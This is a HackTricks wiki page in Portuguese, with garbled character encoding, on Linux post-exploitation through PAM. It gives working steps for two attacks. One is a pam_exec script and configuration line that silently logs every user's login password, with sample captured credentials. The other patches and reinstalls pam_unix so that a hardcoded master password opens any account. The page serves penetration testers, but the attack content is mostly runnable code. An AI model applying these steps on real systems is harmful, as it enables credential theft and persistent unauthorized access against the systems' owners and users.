# PÃ³s-ExploraÃ§Ã£o do Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Sniffing de senhas de login com PAM

Vamos configurar um mÃ³dulo PAM para registrar cada senha que cada usuÃ¡rio usa para fazer login. Se vocÃª nÃ£o sabe o que Ã© PAM, confira:

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

Primeiro, criamos um script bash que serÃ¡ invocado sempre que ocorrer uma nova autenticaÃ§Ã£o.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
```
As variÃ¡veis sÃ£o especÃ­ficas do PAM e estarÃ£o disponÃ­veis por meio do mÃ³dulo `pam_exec.so`.

Aqui estÃ¡ o significado das variÃ¡veis:

* **$PAM\_USER:** O nome de usuÃ¡rio que foi inserido.
* **$PAM\_RHOST:** O host remoto (tipicamente o endereÃ§o IP)
* **$(cat -):** Isso lÃª `stdin`, e conterÃ¡ a senha que o script captura
* Os resultados sÃ£o redirecionados para um arquivo de log em `/var/log/toomanysecrets.log`

Para **impedir que todos os usuÃ¡rios leiam** o arquivo, considere prÃ©-criÃ¡-lo e executar `chmod`, por exemplo:
```bash
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
```
Em seguida, o arquivo de configuraÃ§Ã£o do PAM precisa ser atualizado para que o mÃ³dulo `pam_exec` seja usado para invocar o script.

Existem vÃ¡rios arquivos de configuraÃ§Ã£o localizados em `/etc/pam.d/`, e escolhemos o `common-auth`.
```
sudo nano /etc/pam.d/common-auth
```
Na parte inferior do arquivo, adicione o seguinte mÃ³dulo de autenticaÃ§Ã£o:

`auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh`

As opÃ§Ãµes tÃªm o seguinte significado:

* **optional:** A autenticaÃ§Ã£o nÃ£o deve falhar se houver um erro (nÃ£o Ã© uma etapa obrigatÃ³ria)
* **pam\_exec.so:** Este Ã© o mÃ³dulo PAM que pode invocar scripts arbitrÃ¡rios
* **expose\_authtok:** Este Ã© o truque que permite ler a senha via `stdin`
* **quiet:** NÃ£o mostre nenhum erro ao usuÃ¡rio (se algo nÃ£o funcionar)
* O Ãºltimo argumento Ã© o script shell que foi criado anteriormente

![](<../../.gitbook/assets/image (375).png>)

Finalmente, torne o arquivo executÃ¡vel:

`sudo chmod 700 /usr/local/bin/toomanysecrets.sh`

Agora, vamos experimentar e fazer ssh de outra mÃ¡quina ou fazer login localmente.

E entÃ£o olhe para o arquivo de log:
```
$ sudo cat /var/log/toomanysecrets.log
 Sun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149
 Sun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:
 Sun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149
```
### Backdooring PAM

Vamos para as fontes do PAM (depende da sua distribuiÃ§Ã£o, pegue o mesmo nÃºmero de versÃ£o que a sua...) e procure em torno das linhas 170/180 no arquivo pam\_unix\_auth.c:
```
vi modules/pam_unix/pam_unix_auth.c
```
![](<../../.gitbook/assets/image (651).png>)

Vamos mudar isso para:

![](<../../.gitbook/assets/image (638) (2) (2).png>)

Isso permitirÃ¡ que qualquer usuÃ¡rio que use a **senha "0xMitsurugi"** faÃ§a login.

Recompile o `pam_unix_auth.c` e substitua o arquivo pam\_unix.so:
```bash
make
sudo cp \  
  /home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so \  
  /lib/x86_64-linux-gnu/security/  
```
{% hint style="info" %}
VocÃª pode automatizar esse processo com [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
{% endhint %}

## ReferÃªncias

* [https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)
* [https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
